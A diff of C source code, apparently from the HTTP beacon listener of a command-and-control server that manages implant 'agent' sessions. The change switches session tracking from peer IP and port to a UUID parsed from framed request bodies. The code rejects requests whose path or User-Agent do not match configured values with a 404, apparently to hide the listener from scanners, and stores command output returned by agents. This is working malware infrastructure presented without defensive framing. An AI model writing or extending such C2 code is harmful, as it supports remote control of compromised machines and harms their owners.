@@ -70,7 +70,7 @@ static void HttpSend404(NetSock Conn)
 }
 
 static void HttpDispatch(NetSock Conn, SessionPool *P, const Config *C,
-                         const char *PeerAddr, int SrcPort)
+                         const char *PeerIp)
 {
     char Raw[BufSize] = {0};
     int N = recv(Conn, Raw, BufSize - 1, 0);
@@ -80,23 +80,21 @@ static void HttpDispatch(NetSock Conn, SessionPool *P, const Config *C,
     char Method[64], Path[256], Ua[MaxUaLen], Body[BufSize];
     int BodyLen = 0;
     if (!ParseHttpRequest(Raw, N, Method, Path, Ua, Body, &BodyLen)) return;
-    if (strcmp(Path, C->HttpPath) != 0) { HttpSend404(Conn); return; }
+    if (strcmp(Path, C->HttpPath)  != 0) { HttpSend404(Conn); return; }
     if (strcmp(Ua,   C->UserAgent) != 0) { HttpSend404(Conn); return; }
+    if (BodyLen <= 0) { HttpSend404(Conn); return; }
 
-    char Payload[BufSize] = "Standby";
-    int PayloadLen = 7;
-    if (BodyLen > 0) {
-        memcpy(Payload, Body, (size_t)BodyLen);
-        Payload[BodyLen] = '\0';
-        ApplyXor(Payload, (size_t)BodyLen);
-        PayloadLen = BodyLen;
+    char Uuid[UuidLen], Payload[BufSize];
+    int PayloadLen;
+    if (!FrameParse(Body, BodyLen, Uuid, Payload, &PayloadLen)) {
+        HttpSend404(Conn); return;
     }
 
     int PrevCount   = P->Count;
-    AgentSession *S = PoolRegister(P, PeerAddr, SrcPort);
+    AgentSession *S = PoolRegister(P, Uuid, PeerIp);
     if (!S) { HttpSend404(Conn); return; }
-    int IsNew = (P->Count > PrevCount);
-    if (IsNew) PoolNotifyConnect(P, S);
+
+    if (P->Count > PrevCount) PoolNotifyConnect(P, S);
 
     if (strcmp(Payload, "Standby") != 0) {
         memset(S->LastOutput, 0, BufSize);
@@ -127,9 +125,6 @@ void HttpHandleBeacon(NetSock Listener, SessionPool *P, const Config *C)
     socklen_t PeerLen = sizeof(Peer);
     NetSock Conn = accept(Listener, (struct sockaddr *)&Peer, &PeerLen);
     if (Conn == NetInvalid) return;
-    char PeerAddr[AddrSize];
-    strncpy(PeerAddr, inet_ntoa(Peer.sin_addr), AddrSize - 1);
-    int SrcPort = (int)ntohs(Peer.sin_port);
-    HttpDispatch(Conn, P, C, PeerAddr, SrcPort);
+    HttpDispatch(Conn, P, C, inet_ntoa(Peer.sin_addr));
     NetClose(Conn);
 }
